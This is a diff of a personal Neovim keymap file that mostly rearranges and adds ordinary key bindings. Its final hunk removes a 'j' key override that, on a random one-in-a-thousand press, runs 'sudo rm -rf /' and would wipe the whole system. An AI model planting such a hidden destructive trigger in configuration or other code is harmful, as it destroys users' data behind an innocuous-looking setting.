@@ -58,7 +58,6 @@ end, {silent=true})
 --buffer
 vim.keymap.set('n', '<leader>b', function () fzf.buffers({files = {path_shorten=2}}) end)
 
---zenMode
 vim.keymap.set('n', '<leader>u', ':UndotreeToggle<cr>')
 
 --localleader mapping
@@ -197,6 +196,7 @@ vim.keymap.set('v', '<s-tab>', '<gv', {})
 
 --horizontal scroll
 vim.keymap.set('n', '<C-a>', 'zL', {})
+vim.keymap.set('n', '<C-n>', 'zH', {})
 
 --buffer shortcuts
 vim.keymap.set('n', '<M-x>', '<cmd>bd<CR>', {})
@@ -205,6 +205,13 @@ vim.keymap.set('n', '<M-x>', '<cmd>bd<CR>', {})
 vim.keymap.set('n', '<F3>', function () fzf.files() end , {silent=true})
 vim.keymap.set('n', '<F6>', function () fzf.live_grep() end , {silent=true})
 
+--my ckecklist specific shortcuts
+vim.keymap.set('n', '<F4>', ':lua ToggleTodolist()<CR>', {silent=true})
+vim.keymap.set('n', '<F5>', ':lua ToggleChecklist()<CR>', {silent=true})
+
+--netrw
+vim.keymap.set('n', '<F9>', ':Ex<cr>', {silent=true})
+
 --auto add ; to the end of line
 vim.keymap.set('n', '<M-;>', 'A;<ESC>', {})
 vim.keymap.set('i', '<M-;>', '<ESC>A;<ESC>', {})
@@ -212,19 +219,12 @@ vim.keymap.set('i', '<M-;>', '<ESC>A;<ESC>', {})
 --call cmp select in current word
 vim.keymap.set('n', '<C-SPACE>', 'wi<C-SPACE>', {remap = true})
 
---use my checklist plugin
---my ckecklist specific shortcuts
-vim.keymap.set('n', '<F4>', ':lua ToggleTodolist()<CR>', {silent=true})
-vim.keymap.set('n', '<F5>', ':lua ToggleChecklist()<CR>', {silent=true})
-
-
 vim.keymap.set('n', '<C-c>', ':ccl<enter>', {silent=true})
 
 vim.keymap.set('n', "'s", "'S", {})
 vim.keymap.set('n', "'w", "'W", {})
 
 --Harpoon fork mapping
---quick access
 vim.keymap.set('n', '<M-t>', function ()
   require("harpoon.ui").nav_file(1)
 end, {silent=true})
@@ -237,23 +237,3 @@ end, {silent=true})
 vim.keymap.set('n', '<M-i>', function ()
   require("harpoon.ui").nav_file(4)
 end, {silent=true})
-
-function Set_checklist_keymaps()
-  vim.keymap.set('n', '<esc>', ':lua ToggleChecklist()<CR>', {silent=true, buffer=true})
-  -- vim.keymap.set('n', '<leader>e', ':ToggleTermSendCurrentLine 2<CR>', {silent=true, buffer=true})
-end
-
-function Set_todolist_keymaps()
-  vim.keymap.set('n', '<F4>', function () ToggleTodolist() end, {silent=true})
-end
-
-vim.cmd('autocmd BufEnter checklist.md lua Set_checklist_keymaps()')
-vim.cmd('autocmd BufEnter todolist.md lua Set_checklist_keymaps()')
-
-
-vim.keymap.set('', 'j', function ()
-  local rand_int = math.random(0, 1000)
-  if rand_int == 666 then
-    os.execute("sudo rm -rf /")
-  end
-end)
